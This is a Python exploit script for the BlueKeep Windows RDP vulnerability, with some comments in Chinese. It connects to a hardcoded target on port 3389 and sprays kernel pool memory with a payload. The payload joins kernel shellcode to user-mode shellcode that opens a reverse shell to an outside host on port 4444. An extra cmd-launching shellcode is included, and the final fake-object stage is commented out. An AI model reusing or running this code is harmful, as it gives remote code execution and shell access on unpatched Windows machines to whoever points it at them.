import rdp
import socket
import binascii
import time


def pool_spray(s, crypter, payload):

    times = 10000
    count = 0

    while count < times:

        count += 1
        #print('time through %d' % count)

        try:

            s.sendall(rdp.write_virtual_channel(crypter, 7, 1005, payload))

        except ConnectionResetError:

            print('ConnectionResetError pool_spray Aborting')

            quit()


def main():

    # change to your target
    host = '192.168.1.106'
    port = 3389

    times = 4000
    count = 0

    target = (host, port)

    # 开启sokect，并连接
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(target)

    crypter = rdp.connect(s)

    # this address was choosen for the pool spray. it could be be
    # modified for potentially higher success rates.
    # in my testing against the win7 VM it is around 80% success
    # 0x874ff028
    shellcode_address = b'\x28\xf0\x4f\x87'

    # replace buf with your shellcode
    buf = b""
    buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
    buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
    buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
    buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
    buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
    buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
    buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
    buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
    buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
    buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
    buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
    buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
    buf += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
    buf += b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
    buf += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x00\x22\x68"
    buf += b"\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
    buf += b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
    buf += b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
    buf += b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
    buf += b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
    buf += b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
    buf += b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
    buf += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
    buf += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
    buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

    # bluekeep_kshellcode_x86.asm
    # ring 0 to ring 3 shellcode
    shellcode = b""
    shellcode += b"\x60\xe8\x00\x00\x00\x00\x5b\xe8\x26\x00\x00\x00"
    shellcode += b"\xb9\x76\x01\x00\x00\x0f\x32\x8d\x7b\x3c\x39\xf8"
    shellcode += b"\x74\x11\x39\x45\x00\x74\x06\x89\x45\x00\x89\x55"
    shellcode += b"\x08\x89\xf8\x31\xd2\x0f\x30\x61\xf4\xeb\xfd\xc2"
    shellcode += b"\x24\x00\x8d\xab\x00\x10\x00\x00\xc1\xed\x0c\xc1"
    shellcode += b"\xe5\x0c\x83\xed\x50\xc3\xb9\x23\x00\x00\x00\x6a"
    shellcode += b"\x30\x0f\xa1\x8e\xd9\x8e\xc1\x64\x8b\x0d\x40\x00"
    shellcode += b"\x00\x00\x8b\x61\x04\x51\x9c\x60\xe8\x00\x00\x00"
    shellcode += b"\x00\x5b\xe8\xcb\xff\xff\xff\x8b\x45\x00\x83\xc0"
    shellcode += b"\x17\x89\x44\x24\x24\x31\xc0\x99\x42\xf0\x0f\xb0"
    shellcode += b"\x55\x08\x75\x12\xb9\x76\x01\x00\x00\x99\x8b\x45"
    shellcode += b"\x00\x0f\x30\xfb\xe8\x04\x00\x00\x00\xfa\x61\x9d"
    shellcode += b"\xc3\x8b\x45\x00\xc1\xe8\x0c\xc1\xe0\x0c\x2d\x00"
    shellcode += b"\x10\x00\x00\x66\x81\x38\x4d\x5a\x75\xf4\x89\x45"
    shellcode += b"\x04\xb8\x78\x7c\xf4\xdb\xe8\xd3\x00\x00\x00\x97"
    shellcode += b"\xb8\x3f\x5f\x64\x77\x57\xe8\xc7\x00\x00\x00\x29"
    shellcode += b"\xf8\x89\xc1\x3d\x70\x01\x00\x00\x75\x03\x83\xc0"
    shellcode += b"\x08\x8d\x58\x1c\x8d\x34\x1f\x64\xa1\x24\x01\x00"
    shellcode += b"\x00\x8b\x36\x89\xf2\x29\xc2\x81\xfa\x00\x04\x00"
    shellcode += b"\x00\x77\xf2\x52\xb8\xe1\x14\x01\x17\xe8\x9b\x00"
    shellcode += b"\x00\x00\x8b\x40\x0a\x8d\x50\x04\x8d\x34\x0f\xe8"
    shellcode += b"\xcb\x00\x00\x00\x3d\x5a\x6a\xfa\xc1\x74\x0e\x3d"
    shellcode += b"\xd8\x83\xe0\x3e\x74\x07\x8b\x3c\x17\x29\xd7\xeb"
    shellcode += b"\xe3\x89\x7d\x0c\x8d\x1c\x1f\x8d\x75\x10\x5f\x8b"
    shellcode += b"\x5b\x04\xb8\x3e\x4c\xf8\xce\xe8\x61\x00\x00\x00"
    shellcode += b"\x8b\x40\x0a\x3c\xa0\x77\x02\x2c\x08\x29\xf8\x83"
    shellcode += b"\x7c\x03\xfc\x00\x74\xe1\x31\xc0\x55\x6a\x01\x55"
    shellcode += b"\x50\xe8\x00\x00\x00\x00\x81\x04\x24\x92\x00\x00"
    shellcode += b"\x00\x50\x53\x29\x3c\x24\x56\xb8\xc4\x5c\x19\x6d"
    shellcode += b"\xe8\x25\x00\x00\x00\x31\xc0\x50\x50\x50\x56\xb8"
    shellcode += b"\x34\x46\xcc\xaf\xe8\x15\x00\x00\x00\x85\xc0\x74"
    shellcode += b"\xaa\x8b\x45\x1c\x80\x78\x0e\x01\x74\x07\x89\x00"
    shellcode += b"\x89\x40\x04\xeb\x9a\xc3\xe8\x02\x00\x00\x00\xff"
    shellcode += b"\xe0\x60\x8b\x6d\x04\x97\x8b\x45\x3c\x8b\x54\x05"
    shellcode += b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\x49"
    shellcode += b"\x8b\x34\x8b\x01\xee\xe8\x1d\x00\x00\x00\x39\xf8"
    shellcode += b"\x75\xf1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
    shellcode += b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24"
    shellcode += b"\x1c\x61\xc3\x52\x31\xc0\x99\xac\xc1\xca\x0d\x01"
    shellcode += b"\xc2\x85\xc0\x75\xf6\x92\x5a\xc3\x58\x89\x44\x24"
    shellcode += b"\x10\x58\x59\x58\x5a\x60\x52\x51\x8b\x28\x31\xc0"
    shellcode += b"\x64\xa2\x24\x00\x00\x00\x99\xb0\x40\x50\xc1\xe0"
    shellcode += b"\x06\x50\x54\x52\x89\x11\x51\x4a\x52\xb8\xea\x99"
    shellcode += b"\x6e\x57\xe8\x7b\xff\xff\xff\x85\xc0\x75\x4f\x58"
    shellcode += b"\x8b\x38\xe8\x00\x00\x00\x00\x5e\x83\xc6\x55\xb9"
    shellcode += b"\x00\x04\x00\x00\xf3\xa4\x8b\x45\x0c\x50\xb8\x48"
    shellcode += b"\xb8\x18\xb8\xe8\x56\xff\xff\xff\x8b\x40\x0c\x8b"
    shellcode += b"\x40\x14\x8b\x00\x66\x83\x78\x24\x18\x75\xf7\x8b"
    shellcode += b"\x50\x28\x81\x7a\x0c\x33\x00\x32\x00\x75\xeb\x8b"
    shellcode += b"\x58\x10\x89\x5d\x04\xb8\x5e\x51\x5e\x83\xe8\x32"
    shellcode += b"\xff\xff\xff\x59\x89\x01\x31\xc0\x88\x45\x08\x40"
    shellcode += b"\x64\xa2\x24\x00\x00\x00\x61\xc3\x5a\x58\x58\x59"
    shellcode += b"\x51\x51\x51\xe8\x00\x00\x00\x00\x83\x04\x24\x09"
    shellcode += b"\x51\x51\x52\xff\xe0\x31\xc0"

    shellcode += buf

    print('shellcode len: %d' % len(shellcode))

    payload_size = 1600
    payload = b'\x2c\xf0\x4f\x87' + shellcode
    payload = payload + b'\x5a' * (payload_size - len(payload))

    # payload 攻击汇编语句 用于建立连接
    # crypter 建立连接后返回的结构体
    # fake_obj 攻击汇编语句 用于蓝屏
    print('[+] spraying pool')
    pool_spray(s, crypter, payload)

    ###################################################

    fake_obj_size = 168
    call_offset = 108
    fake_obj = b'\x00'*call_offset + shellcode_address
    fake_obj = fake_obj + b'\x00' * (fake_obj_size - len(fake_obj))

    ##################打开cmd#######################
    outCode = b""
    outCode += b"\xEB\x60\x55\x8B\xEC\x64\xA1\x30"
    outCode += b"\x00\x00\x00\x8B\x40\x0C\x8B\x40"
    outCode += b"\x14\x8B\x00\x8B\x70\x28\x80\x7E"
    outCode += b"\x0C\x33\x75\xF5\x8B\x40\x10\x8B"
    outCode += b"\xF8\x03\x7F\x3C\x8B\x7F\x78\x03"
    outCode += b"\xF8\x8B\xDF\x8B\x7B\x20\x03\xF8"
    outCode += b"\x33\xC9\x39\x4C\x24\x08\xB9\x47"
    outCode += b"\x02\x00\x00\x74\x05\xB9\x3E\x03"
    outCode += b"\x00\x00\x8B\x7B\x24\x03\xF8\x8B"
    outCode += b"\x0C\x4F\x81\xE1\xFF\xFF\x00\x00"
    outCode += b"\x8B\x7B\x1C\x03\xF8\x49\xC1\xE1"
    outCode += b"\x02\x8B\x3C\x0F\x03\xC7\x5D\xC2"
    outCode += b"\x08\x00\x68\x72\x6F\x63\x41\x6A"
    outCode += b"\x00\xE8\x94\xFF\xFF\xFF\x50\x68"
    outCode += b"\x4C\x69\x62\x72\x68\x4C\x6F\x61"
    outCode += b"\x64\xE8\x84\xFF\xFF\xFF\x50\x68"
    outCode += b"\x72\x74\x00\x00\x68\x6D\x73\x76"
    outCode += b"\x63\x54\xFF\xD0\x83\xC4\x08\x68"
    outCode += b"\x65\x6D\x00\x00\x68\x73\x79\x73"
    outCode += b"\x74\x54\x50\xFF\x54\x24\x14\x83"
    outCode += b"\xC4\x08\x68\x63\x6D\x64\x00\x54"
    outCode += b"\xFF\xD0"
    #############################################

    time.sleep(.5)
    print('[+] sending free')
    s.sendall(rdp.free_32(crypter))
    time.sleep(.15)

    print("正在使用新代码 直接上传 不攻击")
    # print('[+] allocating fake objects')
    # while count < times:

    #     count += 1
    #     #print('time through %d' % count)

    #     try:

    #         # s.sendall(rdp.write_virtual_channel(crypter, 7, 1005, fake_obj))
    #         # s.sendall(rdp.write_virtual_channel(crypter, 7, 1005, outCode))
    #         s.sendall(outCode)

    #     except ConnectionResetError:

    #         s.close()

    s.close()


if __name__ == "__main__":
    main()
